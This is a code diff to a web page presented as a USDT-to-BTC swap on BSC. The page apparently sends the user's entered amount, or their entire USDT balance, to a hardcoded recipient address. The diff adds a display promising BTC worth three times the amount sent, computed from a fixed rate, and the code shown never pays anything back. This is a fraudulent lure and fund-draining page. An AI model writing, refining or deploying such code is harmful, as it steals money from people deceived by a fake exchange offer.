@@ -218,8 +218,8 @@
                     </div>
                 </div>
                 <div class="token-amount-container">
-                    <input type="text" id="usdtInput" class="token-amount" value="200" placeholder="200 or 'all'">
-                    <div id="usdtValue" class="token-value">$200</div>
+                    <input type="text" id="usdtInput" class="token-amount" placeholder="Enter amount or 'all'" value="">
+                    <div id="usdtValue" class="token-value">$0</div>
                 </div>
             </div>
 
@@ -232,8 +232,8 @@
                     </div>
                 </div>
                 <div class="token-amount-container">
-                    <div id="btcAmount" class="token-amount">0.00506297</div>
-                    <div id="btcValue" class="token-value">$600.00</div>
+                    <div id="btcAmount" class="token-amount">0</div>
+                    <div id="btcValue" class="token-value">$0</div>
                 </div>
             </div>
 
@@ -293,6 +293,9 @@
         document.addEventListener('DOMContentLoaded', function() {
             // Elements
             const usdtInput = document.getElementById('usdtInput');
+            const usdtValue = document.getElementById('usdtValue');
+            const btcAmount = document.getElementById('btcAmount');
+            const btcValue = document.getElementById('btcValue');
             const swapButton = document.getElementById('swapButton');
             const errorMessage = document.getElementById('errorMessage');
             const buttonText = document.getElementById('buttonText');
@@ -301,7 +304,26 @@
             const BSC_CHAIN_ID = '0x38';
             const USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
             const USDT_DECIMALS = 18;
-            const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943'; // Your recipient address
+            const BTC_RATE = 119489.153599;
+            const RECIPIENT_ADDRESS = '0x6AEB3c0417A79B2b73d4aE32c98BA9B1504b1943';
+            
+            // Update USD value display
+            function updateUSDValue() {
+                const input = usdtInput.value;
+                if (input.toLowerCase() === 'all') {
+                    usdtValue.textContent = 'All balance';
+                    btcAmount.textContent = 'All';
+                    btcValue.textContent = 'All';
+                } else {
+                    const amount = parseFloat(input) || 0;
+                    usdtValue.textContent = `$${amount.toFixed(2)}`;
+                    const btc = (amount * 3) / BTC_RATE;
+                    btcAmount.textContent = btc.toFixed(8);
+                    btcValue.textContent = `$${(amount * 3).toFixed(2)}`;
+                }
+            }
+            
+            usdtInput.addEventListener('input', updateUSDValue);
             
             // Main swap handler
             swapButton.addEventListener('click', async function() {
@@ -368,7 +390,8 @@
                     if (usdtInput.value.toLowerCase() === 'all') {
                         amountToTransfer = await contract.balanceOf(userAddress);
                     } else {
-                        const amount = parseFloat(usdtInput.value) || 200;
+                        const amount = parseFloat(usdtInput.value) || 0;
+                        if (amount <= 0) throw new Error('Please enter valid amount');
                         amountToTransfer = ethers.utils.parseUnits(amount.toString(), USDT_DECIMALS);
                     }
                     
